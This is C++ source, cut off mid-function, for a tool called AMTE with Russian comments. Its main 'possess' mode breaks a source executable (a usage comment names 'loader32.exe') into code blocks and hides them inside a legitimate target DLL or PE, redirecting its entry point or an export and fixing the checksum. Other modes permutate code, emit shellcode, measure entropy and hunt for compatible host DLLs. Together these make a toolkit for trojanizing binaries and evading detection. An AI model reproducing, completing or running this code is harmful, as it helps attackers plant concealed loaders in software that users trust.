#include "common.h"
#include <wincrypt.h>

#include "..\..\..\0lib\code\zmodule_defs.h"

#include "PEModule.h"
#include "Permutatator.h"

namespace amte {


bool isSmallerBlock(BasicBlock* pBlock1, BasicBlock* pBlock2)
{
	// Подсчитываем длины инструкций в каждом блоке.
	return pBlock1->getBlockSize() > pBlock2->getBlockSize();
}

class Application : public Poco::Util::Application
{
public:
	typedef std::vector<uint8_t> ByteVector;
    typedef std::vector<uint32_t> DwordVector;

	enum {
		ModeTransformToZmodule = 0x00000001,
		ModePossess = 0x00000002,
		ModeMakeShellcode = 0x00000004,
		ModeMakeCarray = 0x00000008,
		ModeCollect = 0x00000010,
		ModeCalcEntropy = 0x00000020,
		ModePermutate = 0x00000040,
        ModeRsaKeysGen = 0x00000080,
        ModeMakeJavaarray = 0x00000100,
	};

	Application() :
	_helpRequested(false),
	_mode(0),
    _dll(false),
	_pSourcePE(0),
	_pTargetPE(0)
	{
	}

protected:
	void initialize(Poco::Util::Application& self)
	{
		loadConfiguration();
		Poco::Util::Application::initialize(self);
	}

	void uninitialize()
	{
		Poco::Util::Application::uninitialize();
	}

	void reinitialize(Application& self)
	{
		Poco::Util::Application::reinitialize(self);
	}

	void defineOptions(Poco::Util::OptionSet& options)
	{
		Poco::Util::Application::defineOptions(options);

		options.addOption(
			Poco::Util::Option("help", "h", "display help information on command line arguments")
			.required(false)
			.repeatable(false)
			.callback(Poco::Util::OptionCallback<Application>(this, &Application::handleHelp)));

		options.addOption(
			Poco::Util::Option("config", "c", "load configuration data from a file")
			.required(false)
			.repeatable(false)
			.argument("config")
			.callback(Poco::Util::OptionCallback<Application>(this, &Application::handleConfig)));

		options.addOption(
			Poco::Util::Option("source", "", "Source PE path")
			.required(false)
			.repeatable(false)
			.argument("path")
			.binding("pe.source"));

		options.addOption(
			Poco::Util::Option("target", "", "Target PE path")
			.required(false)
			.repeatable(false)
			.argument("path")
			.binding("pe.target"));

		options.addOption(
			Poco::Util::Option("out", "", "Output path (file or dir)")
			.required(false)
			.repeatable(false)
			.argument("path")
			.binding("pe.out"));

		options.addOption(
			Poco::Util::Option("mode", "", "Tool mode: possess, zmodule, permutate, shellcode, carray, collect, entropy, rsakeys, javaarray")
			.required(false)
			.repeatable(false)
			.argument("value")
			.callback(Poco::Util::OptionCallback<Application>(this, &Application::handleMode)));

		options.addOption(
			Poco::Util::Option("perm", "", "Permutate source PE")
			.required(false)
			.repeatable(false)
			.argument("params")
			.binding("permutator.params"));

        options.addOption(
            Poco::Util::Option("targetmaxsize", "", "Maximum size of target(s) (default: any)")
            .required(false)
            .repeatable(false)
            .argument("size")
            .binding("pe.targetmaxsize"));

		options.addOption(
			Poco::Util::Option("block", "", "Average size of source's basic block for place in target PE (default: 256)")
			.required(false)
			.repeatable(false)
			.argument("size")
			.binding("injector.blocksize"));

        options.addOption(
            Poco::Util::Option("dll", "", "Use dll specific transformations")
            .required(false)
            .repeatable(false)
            .callback(Poco::Util::OptionCallback<Application>(this, &Application::handleDll)));
	}

	void handleHelp(const std::string& name, const std::string& value)
	{
		_helpRequested = true;
		displayHelp();
		stopOptionsProcessing();
	}

	void handleConfig(const std::string& name, const std::string& value)
	{
		loadConfiguration(value);
	}

    void handleDll(const std::string& name, const std::string& value)
    {
        _dll = true;
    }

	void handleMode(const std::string& name, const std::string& value)
	{
		if (value == "possess") {
			_mode = ModePossess;
		}
		else if (value == "zmodule") {
			_mode = ModeTransformToZmodule;
		}
		else if (value == "shellcode") {
			_mode = ModeMakeShellcode;
		}
		else if (value == "permutate") {
			_mode = ModePermutate;
		}
		else if (value == "carray") {
			_mode = ModeMakeCarray;
		}
		else if (value == "collect") {
			_mode = ModeCollect;
		}
		else if (value == "entropy") {
			_mode = ModeCalcEntropy;
		}
        else if (value == "rsakeys") {
            _mode = ModeRsaKeysGen;
        }
        else if (value == "javaarray") {
            _mode = ModeMakeJavaarray;
        }
	}

	void displayHelp()
	{
		Poco::Util::HelpFormatter helpFormatter(options());
		helpFormatter.setCommand(commandName());
		helpFormatter.setUsage("OPTIONS");
		helpFormatter.setHeader("AMTE v" + std::string(AMTE_VERSION));
		helpFormatter.setFooter("Modes:\n"
			"possess - Posess target PE using source PE\n"
			"zmodule - Transform source PE to ZModule\n"
			"permutate - Permutate source PE\n"
			"shellcode - Make shellcode from source PE\n"
            "carray - Make C-array from source file (bin2hex)\n"
			"collect - Collect compatible PE-modules with Source PE\n"
			"entropy - Calculate entropy for source PE\n"
            "javaarray - Make Java-array from source file");
		helpFormatter.format(std::cout);
	}

	bool isParamDefined(char param)
	{
		if (_params.empty()) {
			return false;
		}

		for (std::string::const_iterator itr = _params.begin(); itr != _params.end(); ++itr) {
			if (*itr == param) {
				return true;
			}
		}

		return false;
	}

	void displayEntropyForPE(PEModule& peModule)
	{
		std::cout << "...entropy: " << pelib::entropy_calculator::calculate_entropy(peModule.getPEIStream()) << std::endl;
		std::cout << "....all sections: " << pelib::entropy_calculator::calculate_entropy(*peModule.getPEBase()) << std::endl;
		const pelib::section_list sections = peModule.getPEBase()->get_image_sections();
		for (pelib::section_list::const_iterator itr = sections.begin(); itr != sections.end(); ++itr) {
			if (!(*itr).empty()) {
				std::cout << "....section " << (*itr).get_name() << ": " << pelib::entropy_calculator::calculate_entropy(*itr) << std::endl;
			}
		}
	}

	void generateArray(const std::string& filePath, const std::string& outPath)
	{
		uint32_t i = 0;
		std::string data;
		std::stringstream ss;
		Poco::Path path(outPath);
		std::string arrayName = path.getBaseName();
		Poco::replaceInPlace(arrayName, ".", "_");

		Utils::readFile(filePath, data);

        if (_mode & ModeMakeCarray) {
            ss << "static const unsigned char " << arrayName << "[" << data.length() << "] = {\n    ";

            for (std::string::const_iterator itr = data.begin(); itr != data.end(); ++itr, ++i) {
                int ch = (int)(uint8_t)*itr;
                ss << "0x" << std::hex << std::setw(2) << std::setfill('0') << std::uppercase << ch;
                if ((itr + 1) != data.end()) {
                    ss << ",";
                    if (i > 0 && (i + 1) % 16 == 0) {
                        ss << "\n    ";
                    }
                }
            }
            ss << "};";
        }
        else {
            ss << "package some.package;\n\npublic class PubKey\n{\n\tpublic final static byte buffer[] = {\n\t\t";
            
            for (std::string::const_iterator itr = data.begin(); itr != data.end(); ++itr, ++i) {
                int ch = (int)(char)*itr;
                ss << ch;
                if ((itr + 1) != data.end()) {
                    ss << ",";
                    if (i > 0 && (i + 1) % 16 == 0) {
                        ss << "\n\t\t";
                    }
                }
            }
            
            ss << "};\n}";
        }

		Utils::saveFile(outPath, ss.str());
	}

	void transformToZModule(const std::string& outPath)
	{
        pelib::pe_base* pPE = _pSourcePE->getPEBase();
		uint32_t zmSize, zmAlignedHdrsSize;
		pzmodule_section_header_t pZModuleSectHdr;
		std::string zmBuffer;
		zmBuffer.resize(pPE->get_size_of_image());
		uint32_t exportDirSize = 0, exportDirRVA = 0;
		std::cout << "[+] Transforming PE to ZModule" << std::endl;
		if (pPE->get_machine() == IMAGE_FILE_MACHINE_AMD64) {
			zmodule_header64_t* pZMHeader = (zmodule_header64_t*)&zmBuffer[0];
			zmSize = sizeof(zmodule_header64_t) + sizeof(zmodule_section_header_t) * pPE->get_number_of_sections();
			pZMHeader->numberOfSections = (uint8_t)pPE->get_number_of_sections();
			pZMHeader->sizeOfBaseHeader = sizeof(zmodule_header64_t);
			pZMHeader->sizeOfHeaders = zmSize;
			pZMHeader->sizeOfImage = pPE->get_size_of_image();
			pZMHeader->imageBase = pPE->get_image_base_64();
			pZMHeader->machine = ZMODULE_MACHINE_AMD64;
			zmAlignedHdrsSize = ALIGN_UP_BY(zmSize, pPE->get_section_alignment());
			pZModuleSectHdr = (pzmodule_section_header_t)(&zmBuffer[0] + sizeof(zmodule_header64_t));

			if (pPE->directory_exists(pelib::pe_win::image_directory_entry_basereloc)) {
				pZMHeader->dataDirectory[ZMODULE_DIRECTORY_ENTRY_BASERELOC].size = pPE->get_directory_size(pelib::pe_win::image_directory_entry_basereloc);
				pZMHeader->dataDirectory[ZMODULE_DIRECTORY_ENTRY_BASERELOC].virtualAddress = pPE->get_directory_rva(pelib::pe_win::image_directory_entry_basereloc);
			}
			if (pPE->directory_exists(pelib::pe_win::image_directory_entry_export)) {
				exportDirSize = pPE->get_directory_size(pelib::pe_win::image_directory_entry_export);
				exportDirRVA = pPE->get_directory_rva(pelib::pe_win::image_directory_entry_export);
				pZMHeader->dataDirectory[ZMODULE_DIRECTORY_ENTRY_EXPORT].size = exportDirSize;
				pZMHeader->dataDirectory[ZMODULE_DIRECTORY_ENTRY_EXPORT].virtualAddress = exportDirRVA;
			}
		}
		else if (pPE->get_machine() == IMAGE_FILE_MACHINE_I386) {
			zmodule_header32_t* pZMHeader = (zmodule_header32_t*)&zmBuffer[0];
			zmSize = sizeof(zmodule_header32_t) + sizeof(zmodule_section_header_t) * pPE->get_number_of_sections();
			pZMHeader->numberOfSections = (uint8_t)pPE->get_number_of_sections();
			pZMHeader->sizeOfBaseHeader = sizeof(zmodule_header32_t);
			pZMHeader->sizeOfHeaders = zmSize;
			pZMHeader->sizeOfImage = pPE->get_size_of_image();
			pZMHeader->imageBase = pPE->get_image_base_32();
			pZMHeader->machine = ZMODULE_MACHINE_IA32;
			zmAlignedHdrsSize = ALIGN_UP_BY(zmSize, pPE->get_section_alignment());
			pZModuleSectHdr = (pzmodule_section_header_t)(&zmBuffer[0] + sizeof(zmodule_header32_t));

			if (pPE->directory_exists(pelib::pe_win::image_directory_entry_basereloc)) {
				pZMHeader->dataDirectory[ZMODULE_DIRECTORY_ENTRY_BASERELOC].size = pPE->get_directory_size(pelib::pe_win::image_directory_entry_basereloc);
				pZMHeader->dataDirectory[ZMODULE_DIRECTORY_ENTRY_BASERELOC].virtualAddress = pPE->get_directory_rva(pelib::pe_win::image_directory_entry_basereloc);
			}
			if (pPE->directory_exists(pelib::pe_win::image_directory_entry_export)) {
				exportDirSize = pPE->get_directory_size(pelib::pe_win::image_directory_entry_export);
				exportDirRVA = pPE->get_directory_rva(pelib::pe_win::image_directory_entry_export);
				pZMHeader->dataDirectory[ZMODULE_DIRECTORY_ENTRY_EXPORT].size = exportDirSize;
				pZMHeader->dataDirectory[ZMODULE_DIRECTORY_ENTRY_EXPORT].virtualAddress = exportDirRVA;
			}
		}
		else {
			throw Poco::RuntimeException("Unsupported PE type");
		}

		pelib::section_list& secList = pPE->get_image_sections();
		for (pelib::section_list::iterator itr = secList.begin(); itr != secList.end(); ++itr, ++pZModuleSectHdr) {
			uint8_t* pNull;
			pelib::section& section = *itr;
			pZModuleSectHdr->sizeOfRawData = section.get_size_of_raw_data();
			pZModuleSectHdr->pointerToRawData = (section.get_pointer_to_raw_data() != 0 ? zmSize : 0);
			pZModuleSectHdr->virtualAddress = zmAlignedHdrsSize;
			__movsb((uint8_t*)(&zmBuffer[0] + pZModuleSectHdr->pointerToRawData), (const uint8_t*)&section.getRawData()[0], section.get_size_of_raw_data());
			for (pNull = (uint8_t*)(&zmBuffer[0] + pZModuleSectHdr->pointerToRawData + section.get_size_of_raw_data() - 1); *pNull == 0; --pNull) {
				--pZModuleSectHdr->sizeOfRawData;
			}

			// Обрабатываем таблицу экспорта.
			if (exportDirRVA >= section.get_virtual_address() && exportDirRVA < (section.get_virtual_address() + section.get_size_of_raw_data())) {
				PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(&zmBuffer[0] + pZModuleSectHdr->pointerToRawData + (exportDirRVA - section.get_virtual_address()));
				char* name = (char*)(&zmBuffer[0] + pZModuleSectHdr->pointerToRawData + (pExport->Name - section.get_virtual_address()));
				// Затираем имя модуля.
				for (; *name != '\0'; ++name) {
					*name = '\0';
				}
				pExport->Name = 0;
				pExport->TimeDateStamp = 0;
				pExport->Characteristics = 0;
				pExport->MinorVersion = pExport->MajorVersion = 0;
			}

			zmSize += pZModuleSectHdr->sizeOfRawData;
			zmAlignedHdrsSize += ALIGN_UP_BY(section.get_virtual_size(), pPE->get_section_alignment());
		}
		zmBuffer.resize(zmSize);
		Utils::saveFile(outPath, zmBuffer);
	}

    void generateRsaKeys(const std::string& outPath)
    {
        HCRYPTKEY CapiKeyHandle = 0;
        HCRYPTPROV CapiProviderHandle = 0;
        SECURITY_STATUS secStatus = S_OK;
        std::string privKey, pubKey;
        //PBYTE Blob = NULL;
        DWORD keyLength = 0;

        if (!CryptAcquireContextA(&CapiProviderHandle, TEXT("amte"), MS_STRONG_PROV_A, PROV_RSA_FULL, CRYPT_NEWKEYSET)) {
            secStatus = HRESULT_FROM_WIN32(GetLastError());
            throw Poco::RuntimeException("CryptAcquireContext failed with error 0x%08X" + Poco::NumberFormatter::format(secStatus));
        }

        if (!CryptGenKey(CapiProviderHandle, AT_KEYEXCHANGE, CRYPT_EXPORTABLE, &CapiKeyHandle)) {
            secStatus = HRESULT_FROM_WIN32(GetLastError());
            throw Poco::RuntimeException("CryptGenKey failed with error 0x%08X" + Poco::NumberFormatter::format(secStatus));
        }

        if (!CryptExportKey(CapiKeyHandle, 0, PRIVATEKEYBLOB, 0, NULL, &keyLength)) {
            secStatus = HRESULT_FROM_WIN32(GetLastError());
            throw Poco::RuntimeException("CryptExportKey failed with error 0x%08X" + Poco::NumberFormatter::format(secStatus));
        }
        privKey.resize(keyLength);
        if (!CryptExportKey(CapiKeyHandle, 0, PRIVATEKEYBLOB, 0, (BYTE*)&privKey[0], &keyLength)) {
            secStatus = HRESULT_FROM_WIN32(GetLastError());
            throw Poco::RuntimeException("CryptExportKey failed with error 0x%08X" + Poco::NumberFormatter::format(secStatus));
        }

        Poco::Path oPath(outPath);
        oPath.setFileName("private.key");
        Utils::saveFile(oPath.toString(), privKey);
       
        keyLength = 0;
        if (!CryptExportKey(CapiKeyHandle, 0, PUBLICKEYBLOB, 0, NULL, &keyLength)) {
            secStatus = HRESULT_FROM_WIN32(GetLastError());
            throw Poco::RuntimeException("CryptExportKey failed with error 0x%08X" + Poco::NumberFormatter::format(secStatus));
        }
        pubKey.resize(keyLength);
        if (!CryptExportKey(CapiKeyHandle, 0, PUBLICKEYBLOB, 0, (BYTE*)&pubKey[0], &keyLength)) {
            secStatus = HRESULT_FROM_WIN32(GetLastError());
            throw Poco::RuntimeException("CryptExportKey failed with error 0x%08X" + Poco::NumberFormatter::format(secStatus));
        }

        oPath.setFileName("public.key");
        Utils::saveFile(oPath.toString(), pubKey);
    
        if (CapiKeyHandle != 0) {
            CryptDestroyKey(CapiKeyHandle);
        }

        if (CapiProviderHandle != 0) {
            CryptReleaseContext(CapiProviderHandle, 0);
        }
    }

    // /source=loader32.exe /target=dlls\ir41_qc.dll /out=ir41_qc.dll /mode=possess /dll /block=16

	int main(const std::vector<std::string>& args)
	{
		if (!_helpRequested) {
			try {
				const std::string& sourcePath = config().getString("pe.source", "");
				const std::string& targetPath = config().getString("pe.target", "");
				const std::string& outPath = config().getString("pe.out", "");
				const std::string& permutatorParams = config().getString("permutator.params", "");
                uint32_t targetMaxSize = config().getUInt("pe.targetmaxsize", (uint32_t)-1);
				int maxBlockSize = config().getUInt("injector.blocksize", 256);

				do {
					// Проверяем правильность параметров в зависимости от режима.
					if (_mode & (ModePossess | ModeCollect | ModeTransformToZmodule | ModeMakeShellcode | ModeMakeCarray | ModeMakeJavaarray)) {
						if (sourcePath.empty()) {
							throw Poco::InvalidArgumentException("Please specify /source for input file");
						}
						else if (outPath.empty()) {
							throw Poco::InvalidArgumentException("Please specify /out for output path");
						}
					}

					if (_mode & (ModePossess | ModeCollect)) {
						if (targetPath.empty()) {
							throw Poco::InvalidArgumentException("Please specify /target for target path");
						}
					}
                    else if (_mode & ModeRsaKeysGen) {
                        if (outPath.empty()) {
                            throw Poco::InvalidArgumentException("Please specify /out for output path");
                        }

                        std::cout << "[+] Generating RSA priv/pub keys to " << outPath << std::endl;
                        generateRsaKeys(outPath);
                        break;
                    }

					if (_mode & ModeCollect) {
						Poco::File target(targetPath);
						Poco::File out(outPath);

						if (!target.exists()) {
							throw Poco::NotFoundException(targetPath + " not found");
						}

						if (!out.exists()) {
							throw Poco::NotFoundException(outPath + " not found");
						}
					}

                    if (_mode & (ModeMakeCarray | ModeMakeJavaarray)) {
						std::cout << "[+] Saving C-array to " << outPath << std::endl;
						generateArray(sourcePath, outPath);
						break;
					}
                    
                    int objSize = sizeof(PEModule);
					_pSourcePE = new PEModule(sourcePath, true);					
					
					if (_mode & ModePermutate) {
						std::cout << "[!] Use permutation types: " << std::endl;
						Poco::StringTokenizer params(permutatorParams, "");
						for (int i = 0; i < params.count(); ++i) {
							if (params[i] == "r") {
								std::cout << "... Instructions replacement" << std::endl;
							}
						}
					}
					
					if (_mode & ModeCalcEntropy) {
						displayEntropyForPE(*_pSourcePE);
						break;
					}
					else if (_mode & ModeTransformToZmodule) {
						transformToZModule(outPath);
						break;
					}

                    std::cout << "[+] Analyzing source PE" << std::endl;
					_pSourcePE->analyze(true, false, _dll);
					
					std::cout << "...analyzed code size: " << std::dec << (unsigned int)_pSourcePE->getCodeInfo()->getCodeSize() << " bytes" << std::endl;
					std::cout << "...analyzed data size: " << std::dec << (unsigned int)_pSourcePE->getDatas()->getTotalSize() << " bytes" << std::endl;

					if (_mode & ModePermutate) {
						std::cout << "[+] Permutating source code" << std::endl;
						_pSourcePE->permutate();

						std::cout << "[+] Saving permutated PE to " << outPath << std::endl;
						_pSourcePE->save(outPath);
						break;
					}
					else if (_mode & ModeMakeShellcode) {
						std::cout << "[+] Saving shellcode to " << outPath << std::endl;
						_pSourcePE->saveAsShellcode(outPath);
						break;
					}
					else if (_mode & ModeCollect) {
                        Poco::DirectoryIterator itr(targetPath);
                        Poco::DirectoryIterator endItr;
                        Poco::Path out(outPath);
                        out.makeDirectory().makeAbsolute();

                        for (; itr != endItr; ++itr) {
                            try {
                                Poco::File file(*itr);
                                if (file.isFile()) {
                                    std::cout << "[+] File " << file.path() << std::endl;

                                    if (file.getSize() > targetMaxSize) {
                                        std::cout << "Not compatible" << std::endl;
                                    }
                                    else {
                                        _pTargetPE = new PEModule(file.path(), false);
                                        _pTargetPE->analyze(true, true, true);

                                        if (_pSourcePE->getCodeInfo()->getCodeSize() > _pTargetPE->getCodeInfo()->getCodeSize() || _pSourcePE->getDatas()->getTotalSize() > _pTargetPE->getDatas()->getMaxDataSectionSize()) {
                                            std::cout << "Not compatible" << std::endl;
                                        }
                                        else {
                                            std::cout << "Compatible" << std::endl;
                                            out.setFileName(itr.name());
                                            file.copyTo(out.toString());
                                        }

                                        delete _pTargetPE;
                                        _pTargetPE = 0;
                                    }
                                }
                            }
                            catch (const pelib::pe_exception& e) {
                                std::cout << "[X] " << e.what() << std::endl;
                            }
                            catch (const Poco::Exception& e) {
                                std::cout << "[X] " << e.message() << std::endl;
                            }
                            catch (const std::exception& e) {
                                std::cout << "[X] " << e.what() << std::endl;
                            }
                        }
						break;
					}
					else if (_mode & ModePossess) {
						_pTargetPE = new PEModule(targetPath, false);
						std::cout << "[+] Analyzing target PE" << std::endl;
						_pTargetPE->analyze(true, true, true);
						
						std::cout << "...analyzed code size: " << std::dec << (unsigned int)_pTargetPE->getCodeInfo()->getCodeSize() << " bytes" << std::endl;
						std::cout << "...max section raw size: " << std::dec << (unsigned int)_pTargetPE->getDatas()->getMaxDataSectionSize() << " bytes" << std::endl;

						if (_pSourcePE->getCodeInfo()->getCodeSize() > _pTargetPE->getCodeInfo()->getCodeSize() || _pSourcePE->getDatas()->getTotalSize() > _pTargetPE->getDatas()->getMaxDataSectionSize() ||
                            !checkImportsCompatible(_pSourcePE, _pTargetPE)) {
							std::cout << "[X] Target PE is not compatible :(" << std::endl;
							return 1;
						}

						std::cout << "[+] Splitting source's bblocks into smaller random length bblocks" << std::endl;
						// Разбить блоки необходимо таким образом, чтобы в каждом блоке было не больше одной релоцируемой инструкции.
						splitBigBlocks(*_pSourcePE, maxBlockSize, 1);

						std::cout << "...source's bblocks count: " << std::dec << _pSourcePE->getCodeInfo()->getBlocksCount() << std::endl;
						std::cout << "...target's bblocks count: " << std::dec << _pTargetPE->getCodeInfo()->getBlocksCount() << std::endl;

						std::cout << "[+] Finalizing all source's bblocks" << std::endl;
						_pSourcePE->getCodeInfo()->finalizeAllBlocksWithLongJumps();

						// TODO: Необходимо доработать метод распределения данных по аналогии с блоками, т. е. самые большие куски в первую очередь, потом более мелкие.
						// Так будет больше шансов разместить все данные.
						std::cout << "[+] Randomly distributing source datas in target data section(s)" << std::endl;
						moveAllDataToTarget();

						// Блок на который указывает точка входа.
						uint64_t epVA = _pSourcePE->getImageBase() + _pSourcePE->getPEBase()->get_ep();
						BasicBlock* pEPBlock = _pSourcePE->getCodeInfo()->getBlockAtAddr(epVA);
						if (pEPBlock == 0) {
							throw Poco::NotFoundException("Bblock for entry point not found at 0x" + Poco::NumberFormatter::formatHex(epVA));
						}

                        BasicBlock* pExportBlock = 0;
                        if (_dll) {
                            const pelib::exported_functions_list exports = pelib::get_exported_functions(*_pSourcePE->getPEBase());
                            if (exports.size() != 1) {
                                throw Poco::RuntimeException("Source PE have unsupported number of exports");
                            }
                            const pelib::exported_function exportedFunc = *exports.begin();
                            epVA = _pSourcePE->getImageBase() + exportedFunc.get_rva();
                            pExportBlock = _pSourcePE->getCodeInfo()->getBlockAtAddr(epVA);
                            if (pExportBlock == 0) {
                                throw Poco::NotFoundException("Bblock for exported function not found at 0x" + Poco::NumberFormatter::formatHex(epVA));
                            }
                        }

						// Сортируем блоки по убыванию размера.
						// Это нужно для того, чтобы более мелкие блоки не разбивали более большие, в результате чего может возникнуть ситуация,
						// когда для оставшегося большого блока не найдётся аналогичного или большего ему по размеру.
						BasicBlock* pTargetBlock;
						std::map<BasicBlock*, BasicBlock*> _pairs;
                        BlockVector::iterator tBlockItr;
						BlockVector& blocks = _pSourcePE->getCodeInfo()->getBlocks();
						BlockVector& targetBlocks = _pTargetPE->getCodeInfo()->getBlocks();

						std::cout << "[+] Sorting source's bblocks" << std::endl;
						std::sort(blocks.begin(), blocks.end(), isSmallerBlock);
						std::cout << "[+] Mixing target's bblocks" << std::endl;
                        std::random_shuffle(targetBlocks.begin(), targetBlocks.end());

						std::cout << "[+] Crossing bblocks" << std::endl;
						for (BlockVector::iterator sBlockItr = blocks.begin(); sBlockItr != blocks.end(); ++sBlockItr) {
                            bool ret;
                            BasicBlock* pBlock = *sBlockItr;
                            _sourceRelocs = getRelocsForBlock(pBlock, *_pSourcePE);
							
                            tBlockItr = targetBlocks.begin();
							do {
                                // Ищем все блоки подходящие по размеру и наличию релоков.
                                for ( ; tBlockItr != targetBlocks.end(); ++tBlockItr) {
                                    pTargetBlock = *tBlockItr;
                                    if (pBlock->getBlockSize() <= pTargetBlock->getBlockSize()) {
                                        _targetRelocs = getRelocsForBlock(pTargetBlock, *_pTargetPE);
                                        if ((!_pTargetPE->hasRelocs() || _sourceRelocs.size() <= _targetRelocs.size())) {
                                            break;
                                        }
                                    }
                                }

                                if (tBlockItr == targetBlocks.end()) {
                                    std::string msg = "Any compatible target bblock for bblock at address 0x";
                                    msg += Poco::NumberFormatter::formatHex(pBlock->getFirstInstruction()->VirtualAddr);
                                    msg += " with size ";
                                    msg += Poco::NumberFormatter::formatHex(pBlock->getBlockSize());
                                    msg += " not found";
                                    throw Poco::NotFoundException(msg);
                                }

								ret = crossBlocks(pBlock, pTargetBlock);
                                if (!ret) {
                                    ++tBlockItr;
                                }
							} while (!ret);
							//std::cout << "Blocks: " << std::dec << (sBlockItr - blocks.begin()) << " of " << blocks.size() << std::endl;
						}

						std::cout << "[+] Fixing jumps" << std::endl;
						// Пробегаемся по всем блокам и корректируем адреса в инструкциях перехода.
						for (BlockVector::iterator blockItr = blocks.begin(); blockItr != blocks.end(); ++blockItr) {
							BasicBlock* pBlock = *blockItr;
							if (pBlock->getOutXrefCount() > 0) {
								const XrefVector& xrefs = pBlock->getXrefs();
								for (XrefVector::const_iterator itr = xrefs.begin(); itr != xrefs.end(); ++itr) {
									Xref* pXref = *itr;
									if (pXref->getSourceBlock() == pBlock) {
										DISASM* pInstr = pXref->getSourceInstr();
										int32_t relativeVA = (int32_t)((int64_t)pXref->getTargetBlock()->getFirstInstruction()->VirtualAddr - (int64_t)(pInstr->VirtualAddr + pInstr->len));
										*((uint32_t*)(pInstr->EIP + pInstr->len - sizeof(uint32_t))) = relativeVA;
									}
								}
							}
						}

                        // Корректируем ссылки на код.
                        PEModule::InstrBlockMap& instrBlockMap = _pSourcePE->getBlockRefs();
                        if (!instrBlockMap.empty()) {
                            for (PEModule::InstrBlockMap::iterator itr = instrBlockMap.begin(); itr != instrBlockMap.end(); ++itr) {
                                const DISASM* const pInstr = itr->first;
                                int32_t relativeVA = (int32_t)(itr->second->getFirstInstruction()->VirtualAddr);
                                *((uint32_t*)(pInstr->EIP + pInstr->len - sizeof(uint32_t))) = relativeVA;
                            }
                        }

						// Завершающие действия перед сохранение целевого PE-файла.
						std::cout << "[+] Postpossession corrections in target PE" << std::endl;
                        if (_dll) {
                            pelib::export_info eInfo;
                            pelib::exported_functions_list targetExports = pelib::get_exported_functions(*_pTargetPE->getPEBase(), eInfo);
                            uint32_t rndIndex = Utils::random() % targetExports.size();
                            pelib::exported_function& func = *(targetExports.begin() + rndIndex);
                            do {
                                if (func.get_rva() != _pTargetPE->getPEBase()->get_ep()) {
                                    break;
                                }
                                targetExports.erase(targetExports.begin() + rndIndex);
                                rndIndex = Utils::random() % targetExports.size();
                                func = *(targetExports.begin() + rndIndex);
                            } while (1);
                            
                            pelib::section& exportsSection = _pTargetPE->getPEBase()->section_from_directory(pelib::pe_win::image_directory_entry_export);
                            uint64_t addrOfFunc = eInfo.get_rva_of_functions() - exportsSection.get_virtual_address();
                            addrOfFunc += (func.get_ordinal() - eInfo.get_ordinal_base()) * sizeof(uint32_t);
                            *((uint32_t*)(&exportsSection.getRawData()[0] + addrOfFunc)) = (uint32_t)(pExportBlock->getFirstInstruction()->VirtualAddr - _pTargetPE->getImageBase());
                            std::cout << "[+] Export info: " << func.get_name() << ", #" << func.get_ordinal() << std::endl;
                        }
                        _pTargetPE->getPEBase()->set_ep((uint32_t)(pEPBlock->getFirstInstruction()->VirtualAddr - _pTargetPE->getImageBase()));

						std::cout << "[+] Recalculatting checksum " << std::endl;
						{
							std::stringstream tempStream(std::ios::out | std::ios::in | std::ios::binary);
							pelib::rebuild_pe(*_pTargetPE->getPEBase(), tempStream);
							_pTargetPE->getPEBase()->set_checksum(pelib::calculate_checksum(tempStream));
						}

						// Сохраняем изменённый файл.
						std::cout << "[+] Saving possessioned PE to " << outPath << std::endl;
						_pTargetPE->save(outPath);
					}
				} while (0);

				std::cout << "Done!" << std::endl;
			}
			catch (const pelib::pe_exception& e) {
				std::cout << "[X] " << e.what() << std::endl;
				return -1;
			}
			catch (const Poco::Exception& e) {
				std::cout << "[X] " << e.message() << std::endl;
                return -1;
			}
			catch (const std::exception& e) {
				std::cout << "[X] " << e.what() << std::endl;
				return -1;
			}

			if (_pSourcePE != 0) {
				delete _pSourcePE;
			}

			if (_pTargetPE != 0) {
				delete _pTargetPE;
			}
		}
		return 0;
	}

private:
    bool checkImportsCompatible(PEModule* pSource, PEModule* pTarget)
    {
        const pelib::imported_functions_list& importLibs = pSource->getImportLibs();
        const pelib::imported_functions_list& targetImportLibs = pTarget->getImportLibs();
        for (pelib::imported_functions_list::const_iterator srcImpLibItr = importLibs.begin(); srcImpLibItr != importLibs.end(); ++srcImpLibItr) {
            const pelib::import_library& impLib = *srcImpLibItr;
            for (pelib::imported_functions_list::const_iterator targetImpLibItr = targetImportLibs.begin(); targetImpLibItr != targetImportLibs.end(); ++targetImpLibItr) {
                const pelib::import_library& targetImpLib = *targetImpLibItr;
                if (lstrcmpiA(impLib.getName().c_str(), targetImpLib.getName().c_str()) == 0) {
                    const pelib::import_library::imported_list& imports = impLib.getImportedFunctions();
                    const pelib::import_library::imported_list& targetImports = targetImpLib.getImportedFunctions();
                    for (pelib::import_library::imported_list::const_iterator itr = imports.begin(); itr != imports.end(); ++itr) {
                        const pelib::imported_function& func = *itr;
                        pelib::import_library::imported_list::const_iterator targetItr;
                        for (targetItr = targetImports.begin(); targetItr != targetImports.end(); ++targetItr) {
                            const pelib::imported_function& targetFunc = *targetItr;
                            if (func.getName() == targetFunc.getName()) {
                                break;
                            }
                        }
                        if (targetItr == targetImports.end()) {
                            return false;
                        }
                    }
                }
            }
        }

        return true;
    }

	const DISASM* getRandomInstrBetweenRelocatableInstrs(PEModule& peModule, const BasicBlock* pBlock)
	{
		const DISASM* pInstr1;
		const DISASM* pInstr2;

        // Ищем первые две релоцируемых инструкции и выбираем случайную инстркцию между ними, включая послденюю релоцируемую инструкцию.

		for (InstrVector::const_iterator itr = pBlock->begin(); itr != pBlock->end(); ++itr) {
			pInstr1 = *itr;
			const pelib::relocation_entry* pEntry = peModule.getRelocForInstr(pInstr1);
			if (pEntry != 0) {
				for (++itr; itr != pBlock->end(); ++itr) {
					pInstr2 = *itr;
					pEntry = peModule.getRelocForInstr(pInstr2);
					if (pEntry != 0) {
						InstrVector::const_iterator itr1 = pBlock->begin(pInstr1);
						InstrVector::const_iterator itr2 = pBlock->begin(pInstr2);

                        uint32_t index = itr2 - itr1 - 1;
                        uint32_t rndIndex = 0;
                        if (index > 0) {
                            rndIndex = Utils::random() % index;
                        }
						return *(itr1 + 1 + rndIndex);
					}
				}
			}
		}

		return 0;
	}

	void splitBigBlocks(PEModule& peModule, const int maxBlockSize, const int maxAllowedRelocsPerBlock)
	{
		PECodeInfo* pCodeInfo = peModule.getCodeInfo();
		BlockVector& blocks = pCodeInfo->getBlocks();
		for (BlockVector::iterator itr = blocks.begin(); itr != blocks.end();) {
			BasicBlock* pBlock = *itr;
